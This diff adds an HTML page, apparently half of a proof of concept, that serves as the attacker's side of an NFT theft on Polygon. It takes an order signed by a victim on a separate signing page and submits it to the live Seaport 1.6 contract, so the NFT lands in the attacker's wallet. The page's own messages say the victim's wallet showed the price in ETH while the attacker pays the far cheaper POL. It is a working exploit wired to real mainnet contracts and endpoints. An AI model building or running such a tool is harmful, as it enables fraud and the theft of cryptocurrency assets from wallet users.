@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html><head><title>Attacker — Fulfill Seaport 1.6 Order (Polygon)</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.4/ethers.umd.min.js"></script>
+</head>
+<body style="font-family:monospace;padding:20px;max-width:860px">
+<h3>Attacker side — fulfill the victim-signed Seaport 1.6 order on Polygon</h3>
+<p style="font-size:13px;color:#555">Paste the payload copied from the victim signing page ({"typed":{...},"signature":"0x..."}).
+Connect the attacker wallet (any wallet with POL on Polygon). The order executes against canonical
+Seaport 1.6 at 0x0000000000000068F116a894984e2DB1123eB395 on chain 137 and the NFT lands in your wallet.</p>
+<textarea id="payload" style="width:100%;height:180px;font-family:monospace;font-size:11px;box-sizing:border-box" placeholder='{"typed":{...},"signature":"0x..."}'></textarea><br>
+<button onclick="doConnect()" style="padding:8px 16px;margin-top:8px;font-size:14px">1. Connect attacker wallet</button>
+<button onclick="doCheck()" style="padding:8px 16px;margin-top:8px;font-size:14px">2. Check order</button>
+<button onclick="doFulfill()" style="padding:8px 20px;margin-top:8px;font-size:15px;background:#dc2626;color:#fff;border:none;border-radius:4px;cursor:pointer">3. Buy NFT (pay consideration)</button>
+<pre id="out" style="white-space:pre-wrap;background:#eee;padding:10px;margin-top:12px">waiting...</pre>
+<script>
+const SEAPORT = '0x0000000000000068F116a894984e2DB1123eB395';
+const RPC = 'https://polygon-bor-rpc.publicnode.com';
+// Seaport 1.6 shape: fulfillOrder(Order{parameters, signature}, bytes32 fulfillerConduitKey)
+const FULFILL_ABI = ['function fulfillOrder(((address offerer,address zone,(uint8 itemType,address token,uint256 identifierOrCriteria,uint256 startAmount,uint256 endAmount)[] offer,(uint8 itemType,address token,uint256 identifierOrCriteria,uint256 startAmount,uint256 endAmount,address recipient)[] consideration,uint8 orderType,uint256 startTime,uint256 endTime,bytes32 zoneHash,uint256 salt,bytes32 conduitKey,uint256 totalOriginalConsiderationItems) parameters,bytes signature) order,bytes32 fulfillerConduitKey) external payable returns (bool fulfilled)'];
+const iface = new ethers.Interface(FULFILL_ABI);
+function log(x){ document.getElementById('out').textContent = x; }
+let acct = null;
+function getPayload(){
+  try { return JSON.parse(document.getElementById('payload').value); }
+  catch(e){ throw new Error('payload is not valid JSON: ' + e.message); }
+}
+async function doConnect(){
+  try {
+    const eth = window.okxwallet || window.ethereum;
+    const a = await eth.request({ method: 'eth_requestAccounts' });
+    acct = a[0];
+    const chainId = await eth.request({ method: 'eth_chainId' });
+    if (chainId !== '0x89') {
+      try { await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x89' }] }); }
+      catch(e) { log('connected: ' + acct + '\nswitch to Polygon (137) manually, then continue.'); return; }
+    }
+    log('connected: ' + acct + '\nnetwork: Polygon (137)');
+  } catch(e){ log('connect error: ' + (e.message || e)); }
+}
+async function doCheck(){
+  try {
+    const { typed } = getPayload();
+    const m = typed.message;
+    const prov = new ethers.JsonRpcProvider(RPC);
+    const nft = new ethers.Contract(m.offer[0].token, ['function ownerOf(uint256) view returns (address)','function isApprovedForAll(address,address) view returns (bool)','function name() view returns (string)'], prov);
+    const owner = await nft.ownerOf(m.offer[0].identifierOrCriteria);
+    const appr = await nft.isApprovedForAll(m.offerer, SEAPORT);
+    const now = Math.floor(Date.now()/1000);
+    const native = m.consideration.filter(c => Number(c.itemType) === 0).reduce((s,c) => s + BigInt(c.startAmount), 0n);
+    log('NFT: ' + (await nft.name().catch(()=>'?')) + ' #' + m.offer[0].identifierOrCriteria + ' (' + m.offer[0].token + ')' +
+        '\nofferer (victim): ' + m.offerer +
+        '\nvictim still owns NFT: ' + (owner.toLowerCase() === m.offerer.toLowerCase()) +
+        '\nSeaport approved: ' + appr +
+        '\nprice to pay: ' + ethers.formatEther(native) + ' POL (victim\'s wallet UI showed this as ETH)' +
+        '\norder window: ' + (now >= Number(m.startTime) && now <= Number(m.endTime)
+            ? 'VALID until ' + new Date(Number(m.endTime)*1000).toISOString()
+            : 'EXPIRED — victim must re-sign (orders live 1 hour)'));
+  } catch(e){ log('check error: ' + (e.message || e)); }
+}
+async function doFulfill(){
+  if(!acct){ log('connect first'); return; }
+  try {
+    const { typed, signature } = getPayload();
+    const m = typed.message;
+    const native = m.consideration.filter(c => Number(c.itemType) === 0).reduce((s,c) => s + BigInt(c.startAmount), 0n);
+    const order = {
+      parameters: {
+        offerer: m.offerer, zone: m.zone,
+        offer: m.offer.map(o => ({ itemType: Number(o.itemType), token: o.token, identifierOrCriteria: o.identifierOrCriteria, startAmount: o.startAmount, endAmount: o.endAmount })),
+        consideration: m.consideration.map(c => ({ itemType: Number(c.itemType), token: c.token, identifierOrCriteria: c.identifierOrCriteria, startAmount: c.startAmount, endAmount: c.endAmount, recipient: c.recipient })),
+        orderType: Number(m.orderType), startTime: Number(m.startTime), endTime: Number(m.endTime),
+        zoneHash: m.zoneHash, salt: m.salt, conduitKey: m.conduitKey,
+        totalOriginalConsiderationItems: m.consideration.length
+      },
+      signature: signature
+    };
+    const data = iface.encodeFunctionData('fulfillOrder', [order, '0x' + '00'.repeat(32)]);
+    log('submitting fulfillOrder... paying ' + ethers.formatEther(native) + ' POL');
+    const eth = window.okxwallet || window.ethereum;
+    const txHash = await eth.request({ method: 'eth_sendTransaction', params: [{ from: acct, to: SEAPORT, data: data, value: '0x' + native.toString(16) }] });
+    log('tx sent: ' + txHash + '\nwaiting for confirmation...');
+    const prov = new ethers.JsonRpcProvider(RPC);
+    for (let i = 0; i < 60; i++) {
+      await new Promise(r => setTimeout(r, 4000));
+      const r = await prov.getTransactionReceipt(txHash).catch(() => null);
+      if (r) {
+        if (r.status === 1) {
+          const nft = new ethers.Contract(m.offer[0].token, ['function ownerOf(uint256) view returns (address)'], prov);
+          const owner = await nft.ownerOf(m.offer[0].identifierOrCriteria);
+          log('*** FILLED ***\ntx: https://polygonscan.com/tx/' + txHash +
+              '\nNFT #' + m.offer[0].identifierOrCriteria + ' now belongs to: ' + owner +
+              '\npaid ' + ethers.formatEther(native) + ' POL to the victim, who believed they were selling for ETH');
+        } else log('reverted on-chain: https://polygonscan.com/tx/' + txHash);
+        return;
+      }
+    }
+    log('still pending after 4 min: https://polygonscan.com/tx/' + txHash);
+  } catch(e){ log('fulfill error: ' + (e.message || e) + '\n\nIf the wallet rejects with insufficient funds, it needs POL for the price + gas.'); }
+}
+</script>
+</body></html>
